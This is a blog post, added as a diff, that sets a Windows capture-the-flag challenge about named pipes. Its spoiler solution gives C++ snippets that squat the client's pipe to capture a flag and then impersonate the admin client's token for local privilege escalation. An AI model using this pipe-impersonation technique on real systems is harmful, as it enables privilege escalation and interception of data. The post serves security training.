@@ -1,0 +1,79 @@
+---
+layout: post
+title: "HackMe: Named pipe"
+date: 2022-01-22 10:33:00 +0000
+categories:
+  - Windows
+tags:
+  - winapi
+  - exploitation
+  - challenge
+  - ctf
+  - hackme
+---
+
+<div class="post" itemprop="articleBody">
+          <p>Prerequisites<br>
+<a href="/posts/exploiting-ipc-named-pipes/">Hacking named pipes</a></p>
+<p>Github: <a href="https://github.com/abankalarm/ReHacks" class="inline-onebox">GitHub - abankalarm/ReHacks: This repo will house materials for ReHacks.live</a></p>
+<h1>
+<a name="challenge-1" class="anchor" href="#challenge-1"></a>Challenge</h1>
+<p>Given below is a simple client application that uses named pipes to communicate to the server, The client sends the flag in the pipe to the server.</p>
+<h3>
+<a name="main-objective-2" class="anchor" href="#main-objective-2"></a>MAIN OBJECTIVE:</h3>
+<p>Obtain the FLAG passed by the client to the server.</p>
+<h3>
+<a name="extra-mile-3" class="anchor" href="#extra-mile-3"></a>Extra mile:</h3>
+<p>Give the local user SeImpersonate privilege, and then perform local privilege escalation.</p>
+<p>NOTE:</p>
+<ul>
+<li>The client runs with Admin privileges.</li>
+<li>The exploit code to be written by you, should only be launched as a user process.</li>
+</ul>
+<h1>
+<a name="clientexe-4" class="anchor" href="#clientexe-4"></a>Client.exe</h1>
+<p><a href="https://www.virustotal.com/gui/file/a3353e74e0dff11cce330a2b8d49d411e3877f7468a33cc38a4e8c150488df7b/detection">Virus total scan link</a><br>
+Download link (build from source below)<br>
+<a class="attachment" href="https://github.com/abankalarm/ReHacks/blob/main/Named%20pipe/code/client.cpp">Named_Pipe_Client (source)</a></p>
+<p>Not recommended but if you are really paranoid, the code for the client will be available on GitHub as well, build from <a href="https://github.com/abankalarm/ReHacks/blob/main/Named%20pipe/code/client.cpp">here</a>.</p>
+<details>
+<summary>
+SPOILER: HINTS</summary>
+<ol>
+<li>Use process hacker, IDA, or Process monitor to obtain the name of the pipe.</li>
+<li>Create a fake server using that named pipe.</li>
+</ol>
+</details>
+<details>
+<summary>
+SPOILER: Solution</summary>
+<p>Full code available on<br>
+<a href="https://github.com/abankalarm/ReHacks/tree/main/Named%20pipe" class="inline-onebox">ReHacks/Named pipe at main · abankalarm/ReHacks · GitHub</a></p>
+<p><em><strong>EXPLANATION</strong></em><br>
+Create and get the handle of the named pipe</p>
+<pre><code class="lang-auto">HANDLE hNamedPipe = ::CreateNamedPipe(L"\\\\.\\pipe\\supersecurechannel",
+		PIPE_ACCESS_DUPLEX,
+		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
+		PIPE_UNLIMITED_INSTANCES,
+		1000, 1000, 0, nullptr);
+</code></pre>
+<p>Wait for clients to show up</p>
+<pre><code>if (!::ConnectNamedPipe(hNamedPipe, nullptr) &amp;&amp; ::GetLastError() != ERROR_PIPE_CONNECTED)
+	ERROR("Failed in ConnectNamedPipe");
+</code></pre>
+<p>Read Data off the pipe</p>
+<pre><code class="lang-auto">	WCHAR readDATA[500];
+	DWORD ByteRead;
+	ReadFile(hNamedPipe, &amp;readDATA, sizeof(readDATA)-1, &amp;ByteRead, NULL);
+        printf("PIPE DATA %ls\n", readDATA);
+</code></pre>
+<p>Impersonation</p>
+<pre><code class="lang-auto">	::ImpersonateNamedPipeClient(hNamedPipe)
+	// Write the code you need to execute as admin here
+	// createprocesswithtoken function will suffice in spawning a admin shell
+	//
+	// seImpersonate is needed
+	::RevertToSelf();
+</code></pre>
+</details>
+        </div>
